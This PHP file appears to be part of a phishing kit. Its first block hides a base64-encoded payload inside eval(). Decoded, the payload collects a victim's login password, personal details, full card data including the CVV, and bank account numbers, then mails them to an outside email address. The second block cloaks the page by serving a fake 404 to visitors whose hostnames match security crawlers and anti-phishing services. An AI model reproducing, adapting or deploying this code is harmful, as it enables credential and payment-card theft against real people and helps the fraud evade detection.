<?php eval("?>".base64_decode("PD9waHANCnNlc3Npb25fc3RhcnQoKTsNCg0KJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOw0KJGNyZCA9ICRfUE9TVFsnY3JkJ107DQoNCiRtc2cgPSAiDQoNCkVtYWlsIEFkZHJlc3MgOiAiLiRfU0VTU0lPTlsnZW1haWwnXS4iDQpQYXNzd29yZCA6ICIuJF9TRVNTSU9OWydwYXNzd29yZCddLiINCkZ1bGwgTmFtZSA6ICIuJF9TRVNTSU9OWyduYW1lJ10uIg0KRGF0ZSBvZiBCaXJ0aCA6ICIuJF9TRVNTSU9OWydkYXknXS4iICIuJF9TRVNTSU9OWydtb250aCddLiIgIi4kX1NFU1NJT05bJ3llYXInXS4iDQpCaWxsaW5nIEFkZHJlc3MgOiAiLiRfU0VTU0lPTlsnYmlsbGluZyddLiINCkNpdHkgOiAiLiRfU0VTU0lPTlsnY2l0eSddLiINCkNvdW50eSA6ICIuJF9TRVNTSU9OWydjb3VudHknXS4iDQpQb3N0Y29kZSA6ICIuJF9TRVNTSU9OWydwb3N0Y29kZSddLiINCk1vYmlsZSBOdW1iZXIgOiAiLiRfU0VTU0lPTlsnbW9iaWxlJ10uIg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpOYW1lIE9uIENhcmQgOiAiLiRfUE9TVFsnbm1jJ10uIg0KQ2FyZCBOdW1iZXIgOiAiLiRfUE9TVFsnY3JkJ10uIg0KRXhwaXJ5IERhdGUgOiAiLiRfUE9TVFsnZXhtJ10uIiAiLiRfUE9TVFsnZXh5J10uIg0KQ1NDL0NWViA6ICIuJF9QT1NUWydjc2MnXS4iDQpTb3J0IENvZGUgOiAiLiRfUE9TVFsnc3J0J10uIg0KQmFuayBOYW1lIDogIi4kX1BPU1RbJ25ibiddLiINCkFjY291bnQgTnVtYmVyIDogIi4kX1BPU1RbJ2FjYiddLiINCklQIDogJGlwDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IjsNCg0KJHN1YmogPSAiJGNyZCAtICRpcCI7DQokaGVhZGVycyAuPSAiQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04biI7DQokaGVhZGVycyAuPSAiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogOGJpdG4iOw0KDQptYWlsKCJwYXVsYW5kZXJzb242NzJAZ21haWwuY29tIiwgJHN1YmosICRtc2csIiRoZWFkZXJzIik7DQo/Pg=")); ?>
<?php
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname
$blocked_words = array(
     "above",
     "google",
     "softlayer",
	 "amazonaws",
	 "cyveillance",
	 "phishtank",
	 "dreamhost",
	 "netpilot",
	 "calyxinstitute",
	 "tor-exit",
);


 
 
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
   


?>
